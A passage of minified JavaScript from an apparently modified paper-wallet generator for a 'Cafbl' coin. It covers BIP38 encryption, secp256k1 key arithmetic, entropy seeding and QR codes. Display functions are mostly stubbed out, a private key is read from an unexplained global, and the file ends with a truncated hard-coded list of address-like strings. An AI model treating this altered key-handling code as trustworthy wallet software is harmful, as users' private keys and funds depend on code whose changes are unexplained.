o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++]
        }

        function o(e, t, i) {
          var r;
          return t += 64 * (2 * i - 1), r = (255 & e[t + 0]) << 0, r |= (255 & e[t + 1]) << 8, r |= (255 & e[t + 2]) << 16, r |= (255 & e[t + 3]) << 24
        }

        function d(e, t, o, i, r) {
          for (; r--;) o[i++] = e[t++]
        }

        function m(e, t, o, r, s) {
          for (var n = s >> 5; n--;) o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++], o[r++] = e[t++]
        }
        var g = [],
          h = [];
        if ("undefined" == typeof c) onmessage = function(t) {
          var o = t.data,
            s = o[0],
            n = o[1],
            r = (o[2], o[3]),
            p = o[4],
            i = [];
          m(r, 128 * p * n, i, 0, 128 * n), e(i, 0, n, s, h, g), postMessage([p, i])
        };
        else
          for (var u = 0; r > u; u++) e(c, 128 * u * n, n, s, h, g)
      }
      if (0 == s || 0 != (s & s - 1)) throw Error("N must be > 0 and a power of 2");
      if (s > 2147483647 / 128 / n) throw Error("Parameter N is too large");
      if (n > 2147483647 / 128 / r) throw Error("Parameter r is too large");
      var y = {
          iterations: 1,
          hasher: Crypto.SHA256,
          asBytes: !0
        },
        c = Crypto.PBKDF2(t, o, 128 * r * n, y);
      try {
        var m = 0,
          g = 0,
          d = function() {
            if (!e) {
              var i, u = "(" + l.toString() + ")()";
              try {
                i = new Blob([u], {
                  type: "text/javascript"
                })
              } catch (e) {
                window.BlobBuilder = window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder || window.MSBlobBuilder, i = new BlobBuilder, i.append(u), i = i.getBlob("text/javascript")
              }
              e = URL.createObjectURL(i)
            }
            var f = new Worker(e);
            return f.onmessage = function(e) {
              var o = e.data[0],
                i = e.data[1];
              g++, r > m && f.postMessage([s, n, r, c, m++]);
              for (var d = i.length, l = 128 * o * n, u = 0; d--;) c[l++] = i[u++];
              g == r && a(Crypto.PBKDF2(t, c, p, y))
            }, f
          },
          u = [d(), d()];
        u[0].postMessage([s, n, r, c, m++]), 1 < r && u[1].postMessage([s, n, r, c, m++])
      } catch (e) {
        window.setTimeout(function() {
          l(), a(Crypto.PBKDF2(t, c, p, y))
        }, 0)
      }
    }
  }();


var ninja = {
  wallets: {}
};
ninja.privateKey = {
    isPrivateKey: function(e) {
      return Cafbl.ECKey.isWalletImportFormat(e) || Cafbl.ECKey.isCompressedWalletImportFormat(e) || Cafbl.ECKey.isHexFormat(e) || Cafbl.ECKey.isBase64Format(e) || Cafbl.ECKey.isMiniFormat(e)
    },
    getECKeyFromAdding: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1").getN(),
        i = new Cafbl.ECKey(e),
        r = new Cafbl.ECKey(t);
      if (i.getCafblHexFormat() == r.getCafblHexFormat()) return null;
      if (null == i || null == r) return null;
      var s = new Cafbl.ECKey(i.priv.add(r.priv).mod(o));
      return i.compressed && r.compressed && s.setCompressed(!0), s
    },
    getECKeyFromMultiplying: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1").getN(),
        i = new Cafbl.ECKey(e),
        r = new Cafbl.ECKey(t);
      if (i.getCafblHexFormat() == r.getCafblHexFormat()) return null;
      if (null == i || null == r) return null;
      var s = new Cafbl.ECKey(i.priv.multiply(r.priv).mod(o));
      return i.compressed && r.compressed && s.setCompressed(!0), s
    },
    isBIP38Format: function(e) {
      return e = e.toString(), /^6P[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{56}$/.test(e)
    },
    BIP38EncryptedKeyToByteArrayAsync: function(e, t, i) {
      var r;
      try {
        r = Cafbl.Base58.decode(e)
      } catch (e) {
        return void i(new Error(""))
      }
      if (43 != r.length) return void i(new Error(""));
      if (1 != r[0]) return void i(new Error(""));
      var o = r.slice(-4);
      r = r.slice(0, -4);
      var s = Cafbl.Util.dsha256(r);
      if (s[0] != o[0] || s[1] != o[1] || s[2] != o[2] || s[3] != o[3]) return void i(new Error(""));
      var n = !1,
        p = !1,
        a = !1;
      if (!(66 == r[1])) {
        if (67 != r[1]) return void i(new Error(""));
        if (p = !0, n = 0 != (32 & r[2]), a = 0 != (4 & r[2]), (36 & r[2]) != r[2]) return void i(new Error(""))
      } else if (224 == r[2]) n = !0;
      else if (192 != r[2]) return void i(new Error(""));
      var l, c = {
          mode: new Crypto.mode.ECB(Crypto.pad.NoPadding),
          asBytes: !0
        },
        m = function() {
          var e = new Cafbl.ECKey(l),
            t = e.setCompressed(n).getCafblAddress();
          return s = Cafbl.Util.dsha256(t), s[0] != r[3] || s[1] != r[4] || s[2] != r[5] || s[3] != r[6] ? void i(new Error("")) : void i(e.getCafblPrivateKeyByteArray())
        };
      if (p) {
        var u = r.slice(7, 15),
          y = a ? u.slice(0, 4) : u;
        Crypto_scrypt(t, y, 16384, 8, 8, 32, function(e) {
          var t;
          if (a) {
            var o = e.concat(u);
            t = Cafbl.Util.dsha256(o)
          } else t = e;
          var i = Cafbl.KeyPool.getArray(),
            s = new Cafbl.ECKey(t),
            n = s.setCompressed(!0).getPub();
          Cafbl.KeyPool.setArray(i);
          var p = r.slice(23, 39),
            d = r.slice(3, 15);
          Crypto_scrypt(n, d, 1024, 1, 1, 64, function(e) {
            for (var o = e.slice(32), s = Crypto.AES.decrypt(p, o, c), n = 0; 16 > n; n++) s[n] ^= e[n + 16];
            for (var a = r.slice(15, 23).concat(s.slice(0, 8)), d = Crypto.AES.decrypt(a, o, c), n = 0; 16 > n; n++) d[n] ^= e[n];
            var u = d.slice(0, 16).concat(s.slice(8, 16)),
              y = Cafbl.Util.dsha256(u),
              g = EllipticCurve.getSECCurveByName("secp256k1"),
              f = BigInteger.fromByteArrayUnsigned(t).multiply(BigInteger.fromByteArrayUnsigned(y)).remainder(g.getN());
            l = f.toByteArrayUnsigned(), m()
          })
        })
      } else {
        var g = r.slice(3, 7);
        Crypto_scrypt(t, g, 16384, 8, 8, 64, function(e) {
          var t = e.slice(32, 64);
          l = Crypto.AES.decrypt(r.slice(7, 39), t, c);
          for (var o = 0; 32 > o; o++) l[o] ^= e[o];
          m()
        })
      }
    },
    BIP38PrivateKeyToEncryptedKeyAsync: function(e, t, r, s) {
      var o = new Cafbl.ECKey(e),
        n = o.getCafblPrivateKeyByteArray(),
        i = o.setCompressed(r).getCafblAddress(),
        p = Cafbl.Util.dsha256(i).slice(0, 4),
        a = {
          mode: new Crypto.mode.ECB(Crypto.pad.NoPadding),
          asBytes: !0
        };
      Crypto_scrypt(t, p, 16384, 8, 8, 64, function(e) {
        for (var t = 0; 32 > t; ++t) n[t] ^= e[t];
        var o = r ? 224 : 192,
          d = [1, 66, o].concat(p);
        d = d.concat(Crypto.AES.encrypt(n, e.slice(32), a)), d = d.concat(Cafbl.Util.dsha256(d).slice(0, 4)), s(Cafbl.Base58.encode(d))
      })
    },
    BIP38GenerateIntermediatePointAsync: function(e, t, o, i) {
      var r, s, n = null === t || null === o,
        p = new SecureRandom;
      if (n) s = r = Array(8), p.nextBytes(r);
      else {
        s = [, , , , ], p.nextBytes(s);
        var a = BigInteger(4096 * t + o).toByteArrayUnsigned(),
          r = s.concat(a)
      }
      Crypto_scrypt(e, s, 16384, 8, 8, 32, function(e) {
        var t = n ? e : Cafbl.Util.dsha256(e.concat(r)),
          o = BigInteger.fromByteArrayUnsigned(t),
          s = EllipticCurve.getSECCurveByName("secp256k1"),
          p = s.getG().multiply(o).getEncoded(1),
          a = [44, 233, 179, 225, 255, 57, 226, 81];
        n && (a[7] = 83);
        var d = a.concat(r).concat(p);
        d = d.concat(Cafbl.Util.dsha256(d).slice(0, 4)), i(Cafbl.Base58.encode(d))
      })
    },
    BIP38GenerateECAddressAsync: function(e, t, r) {
      var o = Cafbl.Base58.decode(e),
        i = 83 === o[7],
        s = o.slice(8, 16),
        n = o.slice(16, 49),
        p = (t ? 32 : 0) | (i ? 0 : 4),
        a = Array(24),
        d = new SecureRandom;
      d.nextBytes(a);
      var l = Cafbl.Util.dsha256(a),
        u = EllipticCurve.getSECCurveByName("secp256k1").getCurve(),
        y = u.decodePointHex(ninja.publicKey.getHexFromByteArray(n)),
        c = y.multiply(BigInteger.fromByteArrayUnsigned(l)).getEncoded(t),
        m = new Cafbl.Address(Cafbl.Util.sha256ripe160(c)).toString(),
        g = Cafbl.Util.dsha256(m).slice(0, 4);
      Crypto_scrypt(n, g.concat(s), 1024, 1, 1, 64, function(e) {
        for (var t = 0; 16 > t; ++t) a[t] ^= e[t];
        for (var o = {
            mode: new Crypto.mode.ECB(Crypto.pad.NoPadding),
            asBytes: !0
          }, n = Crypto.AES.encrypt(a.slice(0, 16), e.slice(32), o), d = n.slice(8, 16).concat(a.slice(16, 24)), t = 0; 16 > t; ++t) d[t] ^= e[t + 16];
        var l = Crypto.AES.encrypt(d, e.slice(32), o),
          u = [1, 67, p].concat(g).concat(s).concat(n.slice(0, 8)).concat(l);
        u = u.concat(Cafbl.Util.dsha256(u).slice(0, 4)), r(m, Cafbl.Base58.encode(u))
      })
    }},
ninja.publicKey = {
    isPublicKeyHexFormat: function(e) {
      return e = e.toString(), ninja.publicKey.isUncompressedPublicKeyHexFormat(e) || ninja.publicKey.isCompressedPublicKeyHexFormat(e)
    },
    isUncompressedPublicKeyHexFormat: function(e) {
      return e = e.toString(), /^04[A-Fa-f0-9]{128}$/.test(e)
    },
    isCompressedPublicKeyHexFormat: function(e) {
      return e = e.toString(), /^0[2-3][A-Fa-f0-9]{64}$/.test(e)
    },
    getCafblAddressFromByteArray: function(e) {
      var t = Cafbl.Util.sha256ripe160(e),
        o = new Cafbl.Address(t);
      return o.toString()
    },
    getHexFromByteArray: function(e) {
      return Crypto.util.bytesToHex(e).toString().toUpperCase()
    },
    getByteArrayFromAdding: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1"),
        i = o.getCurve(),
        r = i.decodePointHex(e),
        s = i.decodePointHex(t);
      if (r.equals(s)) return null;
      var n = r.compressed && s.compressed,
        p = r.add(s).getEncoded(n);
      return p
    },
    getByteArrayFromMultiplying: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1"),
        i = o.getCurve().decodePointHex(e),
        r = i.compressed && t.compressed;
      if (t.setCompressed(!1), i.equals(t.getPubPoint())) return null;
      var s = t.priv,
        n = i.multiply(s).getEncoded(r);
      return n
    },
    getDecompressedPubKeyHex: function(e) {
      var t = EllipticCurve.getSECCurveByName("secp256k1"),
        o = t.getCurve().decodePointHex(e),
        i = o.getEncoded(0),
        r = ninja.publicKey.getHexFromByteArray(i);
      return r
    }
  },
ninja.seeder = {
     init: void 0,
     seedLimit: function() {
       var e = Crypto.util.randomBytes(12)[11];
       return 200 + Math.floor(e)
     }(),
     seedCount: 0,
     lastInputTime: new Date().getTime(),
     seedPoints: [],
     isStillSeeding: !0,
     seederDependentWallets: [],
     seed: function(e) {
       if (!e) var e = window.event;
       var t = new Date().getTime();
       ninja.seeder.seedCount == ninja.seeder.seedLimit ? (ninja.seeder.seedCount++, ninja.seeder.seedingOver()) : ninja.seeder.seedCount < ninja.seeder.seedLimit && e && 40 < t - ninja.seeder.lastInputTime && (SecureRandom.seedTime(), SecureRandom.seedInt16(e.clientX * e.clientY), ninja.seeder.showPoint(e.clientX, e.clientY), ninja.seeder.seedCount++, ninja.seeder.lastInputTime = new Date().getTime(), ninja.seeder.showPool())
     },
     seedKeyPress: function(e) {
       if (!e) var e = window.event;
       if (ninja.seeder.seedCount == ninja.seeder.seedLimit) ninja.seeder.seedCount++, ninja.seeder.seedingOver();
       else if (ninja.seeder.seedCount < ninja.seeder.seedLimit && e.which) {
         var t = new Date().getTime();
         SecureRandom.seedTime(), SecureRandom.seedInt8(e.which);
         var i = t - ninja.seeder.lastInputTime;
         SecureRandom.seedInt8(i), ninja.seeder.seedCount++, ninja.seeder.lastInputTime = new Date().getTime(), ninja.seeder.showPool()
       }
     },
     showPool: function() {
       var e;
       for (var t in e = Crypto.util.bytesToHex(null == SecureRandom.poolCopyOnInit ? SecureRandom.pool : SecureRandom.poolCopyOnInit), Math.round(100 * (ninja.seeder.seedCount / ninja.seeder.seedLimit)) + "%", ninja.seeder.seederDependentWallets);
     },
     showPoint: function(e, t) {
       var o = document.createElement("div");
       o.setAttribute("class", "seedpoint"), o.style.top = t + "px", o.style.left = e + "px", document.body.appendChild(o), ninja.seeder.seedPoints.push(o)
     },
     removePoints: function() {
       for (var e = 0; e < ninja.seeder.seedPoints.length; e++) document.body.removeChild(ninja.seeder.seedPoints[e]);
       ninja.seeder.seedPoints = []
     },
     seedingOver: function() {
       ninja.seeder.isStillSeeding = !1, ninja.status.unitTests();
       var e = ninja.tab.whichIsOpen();
       ninja.tab.select(null == e ? "singlewallet" : e);
       var t = null == ninja.getQueryString().culture ? "en" : ninja.getQueryString().culture;
       ninja.translator.translate(t), ninja.seeder.removePoints()
     }
   },
function(e) {
     var t = e.qrCode = {
       getTypeNumber: function(e) {
         var t = 8 * e.length + 12;
         return 72 > t ? 1 : 128 > t ? 2 : 208 > t ? 3 : 288 > t ? 4 : 368 > t ? 5 : 480 > t ? 6 : 528 > t ? 7 : 688 > t ? 8 : 800 > t ? 9 : 976 > t ? 10 : null
       },
       createCanvas: function(e, o) {
         o = null == o ? 2 : o;
         var i = t.getTypeNumber(e),
           r = new QRCode(i, QRCode.ErrorCorrectLevel.H);
         r.addData(e), r.make();
         var s = r.getModuleCount() * o,
           n = r.getModuleCount() * o,
           p = document.createElement("canvas");
         p.width = s * 10, p.height = n * 10, p.style.width = s + "px", p.style.height = n + "px";
         var a = p.getContext("2d");
         a.scale(10, 10);
         for (var d = s / r.getModuleCount(), l = n / r.getModuleCount(), u = 0; u < r.getModuleCount(); u++)
           for (var y = 0; y < r.getModuleCount(); y++) a.fillStyle = r.isDark(u, y) ? "#000000" : "#ffffff", a.fillRect(y * d, u * l, d, l);
         return p
       },
       showQrCode: function() {}
     }}(ninja),
function(e) {
     e.status = function() {
       switch (window.location.protocol) {
         case "file:":
           break;
         case "http:":
         case "https:":
       }
       return {
         unitTests: function() {
           var t = e.unitTests.runSynchronousTests();
           t.passCount == t.testCount ? "good" : "bad"
         },
         showCrypto: function() {},
         showProtocol: function() {},
         showUnitTests: function() {},
         showKeyPool: function() {}
       }
     }()}(ninja),
ninja.tab = {
     select: function(e) {
       var t = e.getAttribute("id");
       if (-1 == e.className.indexOf("selected")) {
         for (var o in ninja.wallets) ninja.wallets[o].close();
         0 == ninja.seeder.isStillSeeding || "brainwallet" == t || "detailwallet" == t ? (e.className += " selected", ninja.wallets[e.getAttribute("id")].open()) : 1 == ninja.seeder.isStillSeeding && "brainwallet" != t && "detailwallet" != t
       }
     },
     whichIsOpen: function() {
       var e;
       for (var t in ninja.wallets)
         if (e = ninja.wallets[t].isOpen()) return t;
       return null
     }},
ninja.getQueryString = function() {
     for (var e, t = {}, o = location.search.substring(1), i = /([^&=]+)=([^&]*)/g; e = i.exec(o);) t[decodeURIComponent(e[1])] = decodeURIComponent(e[2]);
     return t},
ninja.runSerialized = function(e, t) {
     if (t = t || function() {}, 0 === e.length) t();
     else {
       var o = e.shift();
       o(function() {
         ninja.runSerialized(e, t)
       })
     }},
ninja.forSerialized = function(e, t, i, r) {
     r = r || function() {}, e === t ? r() : i(e, function() {
       ninja.forSerialized(++e, t, i, r)
     })},
ninja.foreachSerialized = function(e, t, o) {
     var r = [];
     for (var i in e) r.push(i);
     ninja.forSerialized(0, r.length, function(e, i) {
       t(r[e], i)
     }, o)
   },
function(e) {
     var t = e.singlewallet = {
       isOpen: function() {
         return !1
       },
       open: function() {
         t.generateNewAddressAndKey()
       },
       close: function() {},
       generateNewAddressAndKey: function() {
         try {
           var e = new Cafbl.ECKey(!1);
           e.setCompressed(!0), e.getCafblAddress(), e.getCafblWalletImportFormat()
         } catch (e) {
           alert(e)
         }
       }
     }}(ninja.wallets, ninja.qrCode),
ninja.wallets.paperwallet = {
     isOpen: function() {
       return !1
     },
     open: function() {},
     close: function() {},
     remaining: null,
     count: 0,
     pageBreakAtDefault: 7,
     pageBreakAtArtisticDefault: 3,
     useArtisticWallet: !0,
     pageBreakAt: null,
     build: function(e, t, i, r) {
       if (1 > e && (e = 1), 1 > t && (t = 1), ninja.wallets.paperwallet.remaining = e, ninja.wallets.paperwallet.count = 0, ninja.wallets.paperwallet.useArtisticWallet = i, ninja.wallets.paperwallet.pageBreakAt = t, ninja.wallets.paperwallet.encrypt) {
         if ("" == r) return;
         ninja.privateKey.BIP38GenerateIntermediatePointAsync(r, null, null, function(e) {
           ninja.wallets.paperwallet.intermediatePoint = e, setTimeout(ninja.wallets.paperwallet.batch, 0)
         })
       } else setTimeout(ninja.wallets.paperwallet.batch, 0)
     },
     batch: function() {},
     generateNewWallet: function(e) {
       if (ninja.wallets.paperwallet.encrypt) {
         ninja.privateKey.BIP38GenerateECAddressAsync(ninja.wallets.paperwallet.intermediatePoint, !0, function(t, o) {
           Cafbl.KeyPool.push(new Cafbl.Bip38Key(t, o)), ninja.wallets.paperwallet.useArtisticWallet ? ninja.wallets.paperwallet.showArtisticWallet(e, t, o) : ninja.wallets.paperwallet.showWallet(e, t, o)
         })
       } else {
         var t = new Cafbl.ECKey(!1);
         t.setCompressed(!0);
         var o = t.getCafblAddress(),
           i = t.getCafblWalletImportFormat();
         ninja.wallets.paperwallet.useArtisticWallet ? ninja.wallets.paperwallet.showArtisticWallet(e, o, i) : ninja.wallets.paperwallet.showWallet(e, o, i)
       }
     },
     templateHtml: function() {
       var e = "";
       ninja.wallets.paperwallet.encrypt && (e = "");
       return "<div class='public'></div>"
     },
     showWallet: function(e, t, o) {
       var i = {};
       i["qrcode_public" + e] = t, i["qrcode_private" + e] = o
     },
     showArtisticWallet: function(e, t, o) {
       var i = {};
       (i["qrcode_public" + e] = t, i["qrcode_private" + e] = o, ninja.qrCode.showQrCode(i, 2.5), ninja.wallets.paperwallet.encrypt) && o.length / 2
     },
     toggleArt: function() {
       ninja.wallets.paperwallet.resetLimits()
     },
     toggleEncrypt: function(e) {
       ninja.wallets.paperwallet.encrypt = e.checked, ninja.wallets.paperwallet.resetLimits()
     },
     resetLimits: function() {}
   },
function(e, t, i, o) {
     var r = e.detailwallet = {
       isOpen: function() {},
       open: function() {},
       close: function() {},
       openCloseFaq: function() {},
       getKeyFromInput: function() {
         var e = window.prk211.toString().replace(/^\s+|\s+$/g, "");
         return window.prk211 = e, e
       },
       checkAndShowMini: function(e) {
         Cafbl.ECKey.isMiniFormat(e)
       },
       checkAndShowBase6: function() {},
       keyToECKeyWithBrain: function(t) {
         var i = new Cafbl.ECKey(t);
         if (null != i.error) alert(o.get("detailalertnotvalidprivatekey") + "\n" + i.error);
         else if (null == i.priv && t.length >= e.brainwallet.minPassphraseLength) {
           var r = confirm(o.get("detailconfirmsha256"));
           if (r) {
             var s = Crypto.SHA256(t, {
               asBytes: !0
             });
             i = new Cafbl.ECKey(s)
           }
         }
         return i
       },
       decryptBip38: function() {
         r.clear()
       },
       encryptBip38: function() {
         r.clear()
       },
       viewDetails: function(e) {
         if ("" != e && !i.isBIP38Format(e)) {
           r.checkAndShowMini(e), r.checkAndShowBase6(e);
           var t = r.keyToECKeyWithBrain(e);
           if (null != t.priv) return r.populateKeyDetails(t)
         }
       },
       populateKeyDetails: function(e) {
         if (null != e.priv) {
           e.compressed, e.setCompressed(!1);
           var t = e.getCafblAddress();
           return [e.getPubKeyHex(), t]
         }
       },
       clear: function() {
         r.getKeyFromInput()
       },
       enterOnPassphrase: function() {},
       toggleEncrypt: function() {}
     }}(ninja.wallets, ninja.qrCode, ninja.privateKey, ninja.translator);


(function() {
  window.prk211 = "", window.prkupdate = !1, window.prk11570 = "7XuVSEpWW4trkfmvWzegTHQt7BdktSKUs,83hmJGRuTEi2YDCWy5iozY8rZtFwVgahM,FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF,HQ3Go3ggs8pFnXuHVHRytPCq5fGG8Hbhx,LdRcdxfbSnmCYYNdeYpUnztiYzVfBEQeC,AC4fMwgY8j9onSbXEWeH6Zan8QGMSdmtA,5VREscuZWHb41zzyivw6ZYagMyJ6YKFHd,7hf5H8D6Yc4B7zHEg3orAtKn7Jhme7Adx,3JQwoSLLR3ffXwswe2HCTK9oq4i8MWK3q,P5ZEDWTKTFGxQjZphgWPQUpe554WKDfHQ,2tkqA9xSoowkzoERHMWNKsTey55YEBqkv,MrMeBmbcDjLc52i7j3SdznChU4Fd4WHbw,MDq7zyLw6oKichbFiDDZ3aaK59byc6CT8,7rm2dvb439dZqyMe2d4D6AQJSgg6yeNRn,Fp9KLM6cs35y8QvyqAiL714WMFSLBJDLC,6GTzLcEsAm4tHhwtZV1F6gxYDMmbdSMrv,2BZD75sbMmdj5dy1d5cS2Lo4YWs1FDbDn,2nxRsisUcJqCDeUpTYH2a7F5jcad3YhFG,Cr7EjvS8C7gfarREHCvFhd9gT3r46pfLb,PeizMg76Cf96nUQrYg8xuoZWLQozU5zGW,GR9qNz7zgtaW5HwwVpEJWMnGWhsbsieCG,N9an8wv4SYi3FVXs3xR5k2AqXeNZiw2mf,BvdLm9RcFWncKpJYr7YjFttYJ9zLf7We,8jNaBVYmDzVWHiCDaShF6cZs9DV4N3omi,KUr81aewyTFUfnq4ZrpePZqXixd59ToNn,GaB3nRWA1PLc3XQkkbpVtFwYYZEuMxD4i,FrM1He2ZDbsSKmYpEZQNGjFTLMgCZZkaf,BZaYtmXka1y3Byi2yvXCDG92Tjz7ecwYj,KeK2uTAe8hDVKTbpyDDzd7qfRZ8z3LJx,HBM45n214sV9yXoizBwTksUgEysTPpk46,4Ai5GcasUdr5hR2GMzeojkzB9cm4oufHt,Q7cu7WkeDurYgffeEc9CEnA6zLohbh9iQ,Enhkd9LkQV56a9M12P4VuMDkjyTeLJy5m,JpiTWauQdtysbynNp88dWeuyg2gBbKDcT,6Azr3MAzMKMPmxZXfRsBbBPYHnp2CuJNJ,EDRfeNkjkH2SAhSbEKzhKuabnEbVWbKEp,Hyh53PULY6Jyq5LPAJ4CHjgzEbVaqy7KU,JYbzYitYQ1ZWTx5KEx7WH2AejC5i5UUbF,2n3s8MCqdZzPnTisYrXagbfw8pJg8y9BW,9Te6hzGFSbryomVYqzG2kpBmAJYykx5Yv,MVo3EXLakJym29CFK6o1MyaCBMdvcmmrL,MqAfNMgbZoKtRinT89q1faSZqTKTqCFhR,FUBESNxB2JkyXPc4o9wwoGt158DC9A8dj,NNGdZMYsN9pgLSXZ5dD5KFUbatFynpmvY,H2zrVQxU3ymunr9CunjoActooLW2ryQK7,C5TB2QzeDDJUE4EQD17NmSyEXTk34huRo,Grbj3Q9awmMpVhrQ94y7BU4WaEq8yUZSn,7YyZSNFt31pzGXfZtrzs7Y5Nd56rG2uU5,q9kwzJggw6AbQjzJeYQFYK8D5gQK8sSh,5xZvLJLAgxh8cxEmAbpx1H35oibHo5cLA,53efDAfh8gUqGPH85JQXTrh8CQktAo9ug,7rfparnM8RaaUyuHFNC9ErqkvRqebNPjE,923qxU74HWWz75LgWTsPE4FT9Zyd6n6bv,9G5kkYvjawZiYKhFeh8WmfBN31pdP94Jr,AWpzKtkHfWsiv9RGXKA3Z8951LefsUGXQ,Hm9vfrEX7Gyjz2Nhi3McQ34PryLDHGrCq,MWqbpfzxgojEAah6PMZoZPdUPUTuyTpan,3ZNiyx5Z5CMkULX7ENvcKKxFNCzGJv5vQ,2sxoQm32gwDXevTijx4MTDCzx91dH4uj3,F34duy2eeMz5mSrvFepVzy7Y1rBsnAyWC,L5D4Eq2RkEKuN717Gc817MH1Sxs5WwMQh,f1miYFQWTzdLiCBxtHHnNiW7WAWPUccr,E5B5QbDjUL471PEed9vZDwCSck9btBLkD,KbrSKrT3GeEruTuuYYUSQ35JwKbrAWJYm,4YK4mzJGo5NKkNnmVJeuEAQftLt795Gec,P1iThxBH542Gmk1kZNXyji4E4iwpvSbrt,2tLs9c9RsALt4ockxa1hB4iTCTSmxj2me,BAFWQhH9pNkz3mZDQ1tWrtKkSHVCkc3fV,CPaziTqeEixPoSFtJxu74uDGbpEAotZom,ucXXZQSEf4zny2HRwAQKtVpkLPTUKRtt,Ki3WTEEqTLPNsN5cGTsMkL2sJ4m5mdCXT,3QoG5ioV4hseifKT9iaqrmD2eis7DicWA,MnYVNYCEL2okaBa1et3bXtNA75tBQXHKc,LfV1tSt3KNyHpFJnAzrqsLFdeD2EvU1MK,QaTfNSuBo9PEHnhQKFNspEHvQXwib5g63,Kx4QFupZ9vKFmUDhsptfSBPEKXJKV5MuN,EVbz7mBRpKBeBp6Qjq1b1uMYtRgTcTLyc,PN1xjngm9jhY9duuR8af7CXmK3QVcsixJ,EU2pMence1UfifCco2UHJCdoqorAtpT7,38uPVW8drux5gSemDS4gFLSGrSfAiEvpX,6QdwHXkPQNvn7vbCfp437AwTQDnXZxnsa,Ki8MffYtNtjzcpQJ2hYbihDzgtRte7VEy,DGxAYYUA61WrrdbBac8Ra9eA9peAQwTJF,Moe7Btq7uRRULD11XLAnZPSUaVAxW7zbv,Kd6zLb9iAjcrgq8HzWnoWNVLYYWjp3swA,P9fAFAsSLRmMu2P7wZ5CXDPRfLSWTy9N8,HLvaTs3zR3oev9ya7Pzp3GB9Gqfg6XYJT,LHmwfiBQNwLR4bxtSQNkbmwz5c7TEnsLP,7CzhFvGwH6TT46JtzhnhMpTw4mHYpEGCR,Cb1G5qFK91fShyaPPZWVFwYFBtqRG7h8D,LYJfcfHPXYJreMsASk2jkn69LWEYKzexb,2yqigcnS2v46sFrUWvX1W9bRWqivrEGeh,NmHmQte2rP8pS54U3B8LPYQKkpG1pFF69,67ZWTT8n6s4ya8cGjqNNQjDwDGY31vmHg,HmJDpQvyqfZ2RZvyheB43NBPQRN3FVoFd,HTzd3sKVmrTNZ6QGisPPA1MvBkoyPiZWJ,Bm3yQ1XGbboSruyfVmadaf4TXHedBmKxG,DWxysF7GPRYGShNxL5ux2N2JLRa9rbE6k,56Zz26iW3tYd1xWJjVGa8CPbjC9W5EW9f,HGVtEtKWayb56xiZ4YJQieWFv8m7GEc7E,BpQbqhiphkDKm4FMXQ7w7Tmn7KpTDWamr,9rxQRpXBMQcbsYcxo6w9xL54o1sXDeXdA,M219KR5vEneNb47ewrPfWyb5jQ2DjxRP6,LvK7QJD8K3u6dzFHNc1g9ehezrohUKvUx,QHVStz4ALAF8LFokjLy9QFaZKUFdraxeo,FdFFJRqvBWKEjFqkZhxuGbN9HNUVAfLqF,8zuLTKQnLjp987LdxuYvjekYnNAvXif2b,NpZcfBnaJeoRT9ZqwZVRMw3SRs546VsuE,PWn1AGqo8HWH8mXSsxx1Ytk87zMAAziFU,98aMn6ZYAczwrE5NvNTUMyJ5qkfy4g3Hi,MYv4C4hZ7hC5sbHrPkzvmNoozQgnHKeAU,82p5CrqfDxvonznRyi5AUBwsCkDX8eYMe,LyTftu54VMYCv5pq3S4pMzPRMnsYKTESw,4hdaXfy2Vt5a2paHtLwEqobUQPrco7RL9,5mxk4fKk9ggQ4fikNWKpasahsdXZNdVu2,4KzHoS5dXbhy2kBevNKLz2ZMtjaqHkKWZ,HG6NbWmJjjSE1Z6oPetWG3nnKrQxgBN3a,8Ayw3caz2xGDhTfz1nJxLw1NURPtBNJnn,GBWcQuY5aD6e2zrbdb38j7pizVr2wcJnC,8saWjMCchDTGWunefuDJSWNdz4p6KtfBL,FMbcnYvvccZ6hR324cFRpn1QX9TCkqtAe,Kphp4WNPLpScp5T5f63jnVS9ohK6a86g7,T7m8nSs5Yh3YuLNoHPb5ehwN3LRVEchn,Eqj1APg1dkcPH7CmHJ6SzRwtJRLpxtBFA,6dyizLarM2N4UjGaEFPESNmJC5vEALtZX,FtHBKrYkDchMA1pwRTpYZ77TpfwSgh6iF,5URsTiy1ksoMMV7DuEi9hvSqHgqobAtKa,Fn4FSiHFr9SgbQ3ccsybN9f3RF1omst4x,E1SKgxgYJFXzaLxgat2FNSnwWeKz1U15N,Lan1sQzYGViDZskUFmnitJvfejn2jYdNS,5ZQJagAa2iUCwpQXUUCZ4BfzFW5TAVyJj,HGdi2AtuvBUcdTFe62sKd7ZAFzoG7iQLb,2Gjyd3MMR7Dj2KwCxw71wwzZXVp2xy8nK,FDzP5vQGMhCzeb9nH4AcUDnUbcHS22BMZ,Dt4Q2ofKUtHwvjN45tAUfikNBfJrDERcZ,5QFkJUWFZ6QRpTrzUitH2Egyf1JTngVgV,BMi633XQ8jt45Tb5EvZ4xdZHb2GzxKSfb,7J26KSDtNFPAUhCMwjcRNWhneMsXS75Ba,9om4Guv9QmVesS7AewMUyE5JUJ9H7xwNN,DdxS8CheskxKAPPbG8Uq4Qts8kS4x1tt2,9F4xZNBxtPAdMqFudr2LDH5efeeUYF21x,57ZXCYfK6NqBiFLkoLDt3PN8KyE8xdTu5,6BiUbH8yxFmCJs4ArtyTgHKfXQFvkvPNr,FrfmxAhYRNU9ebotDHP9FqLbe54QZVcfi,KLay1g7rZxAiotuDhGy5YizdXSpqkFxQ9,NQWCZqRYvANz3iX1Wnczpm277VEYvcAee,2yePmcVhMzzHYwh4